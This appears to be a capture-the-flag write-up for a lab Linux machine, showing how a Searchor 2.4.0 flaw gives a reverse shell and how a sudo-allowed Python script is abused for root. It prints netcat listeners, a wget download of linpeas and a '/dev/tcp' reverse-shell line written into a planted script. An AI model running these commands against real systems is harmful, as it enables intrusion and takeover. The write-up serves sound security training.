
**OS:** Linux  
**Date:** 15.10.2026


## Enumeration
Our initial scans yields these open ports at the target host:

![](../../../../../0%20Github%20portfolio/Writeups%20and%20reports/Images/Pasted%20image%2020261013155000.png)

It only has two ports open. We open the web application over port 80 and it looks like a sort of search engine. It lists that it is powered by Flash and Searchor 2.4.0. It conveniently links to the Github as well.

![](../../../../../0%20Github%20portfolio/Writeups%20and%20reports/Images/Pasted%20image%2020261013155420.png)

Under releases, it shows that a vulnerability has been patched in v2.4.2, which suggests that there is an exploitable vulnerability prior to this version:

![](../../../../../0%20Github%20portfolio/Writeups%20and%20reports/Images/Pasted%20image%2020261013155700.png)

We Google "Searchor 2.4.0 exploit POC" to see if anyone has created a guide for us. They have:
https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-

![](../../../../../0%20Github%20portfolio/Writeups%20and%20reports/Images/Pasted%20image%2020261013155819.png)

The POC highlights how we can change a POST request where we change a query parameter with BurpSuite to upload a reverse shell to the application for execution. Prior to this we set up a listener:
```
sudo nc -lvnp 443
```

![](../../../../../0%20Github%20portfolio/Writeups%20and%20reports/Images/Pasted%20image%2020261013160040.png)
# Exploitation

We then edit the query parameter to include the payload, editing the ATTACKER_IP and ATTACKER_PORT:

![](../../../../../0%20Github%20portfolio/Writeups%20and%20reports/Images/Pasted%20image%2020261013162459.png)

As we see in the lower part of the screen, the shell spawns. We then stabilize the shell and also get pretty colors.
## Post-Exploitation (Privilege Escalation)
To find an escalation path, we run Linpeas. 
To do that, we must transfer Linpeas to our target. We set up a Python http server from our attacker machine from the folder where Linpeas is stored:

```
python3 -m http.server 80
```

On our target we go to the /tmp folder, which is writable and get it:
```
wget 10.10.15.33/linpeas.sh -O linpeas.sh
```

We then set execution permission:
```
chmod 777 linpeas.sh
```
and then run it:
```
./linpeas.sh
```

![](../../../../../0%20Github%20portfolio/Writeups%20and%20reports/Images/Pasted%20image%2020261015094028.png)

Linpeas is diligent in giving a lot of text, so we go through the output thoroughly. 

We find a subdomain which is gitea.searcher.htb hosted on port 80 as well, which we take a look at. Poking around we find a user cody:

![](../../../../../0%20Github%20portfolio/Writeups%20and%20reports/Images/Pasted%20image%2020261015095850.png)

Poking around the path where we landed we also find cody with possible credentials:

![](../../../../../0%20Github%20portfolio/Writeups%20and%20reports/Images/Pasted%20image%2020261015102530.png)

We attempt to use the credentials on the self hosted git, and they work:

![](../../../../../0%20Github%20portfolio/Writeups%20and%20reports/Images/Pasted%20image%2020261015102950.png)

It seems to be the server code for the application hosted at searcher.htb
We poke around, but don't find anything interesting for now.

We try the credentials with
```
sudo -l
```

![](../../../../../0%20Github%20portfolio/Writeups%20and%20reports/Images/Pasted%20image%2020261015111001.png)

We see that we can run the system-checkup.py script as root.

Let's try to interact with it (putting an argument in because it needs on as indicated by the wildcard):

```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py junk
```

It lists three possible actions, and we try all three:

![](../../../../../0%20Github%20portfolio/Writeups%20and%20reports/Images/Pasted%20image%2020261015115928.png)

We see that we can likely get information about the database with the docker-inspect command. We try:
```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect "{{json .}}" mysql_db | jq
```

![](../../../../../0%20Github%20portfolio/Writeups%20and%20reports/Images/Pasted%20image%2020261015120741.png)

The environment file is listed and it shows several credentials we can attempt to use.
We try all the passwords for the Gitea host for administrator, which works:

![](../../../../../0%20Github%20portfolio/Writeups%20and%20reports/Images/Pasted%20image%2020261015122656.png)

We poke around and find the script we just interacted with.

![](../../../../../0%20Github%20portfolio/Writeups%20and%20reports/Images/Pasted%20image%2020261015122729.png)

Earlier we ran this, but it threw "Something went wrong" since it did not find the full-checkup.sh file in the current working directory. That probably means that if we were to put a full-checkup.sh in the current directory, it will likely run it within the context of root. That means that we want to put a reverse shell into the current directory and call full-checkup like we did earlier.

First, we get a payload from revshells.com and put it into a full-checkup.sh file:
```
echo "sh -i >& /dev/tcp/10.10.15.33/4444 0>&1" >> full-checkup.sh
```
We must then set the interpreter:
```
nano full-checkup.sh
```
At the top of the file we must put the interpreter:  `#!/bin/bash`
Then CTRL+X and then Y to save and ENTER.

and then we set chmod:
```
chmod 777 full-checkup.sh
```
We set up a listener for the reverse shell on our attacker:
```
nv -lvnp 444
```
And then we run it:
```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

As we see, we have root, which concludes this box:

![](../../../../../0%20Github%20portfolio/Writeups%20and%20reports/Images/Pasted%20image%2020261015131104.png)
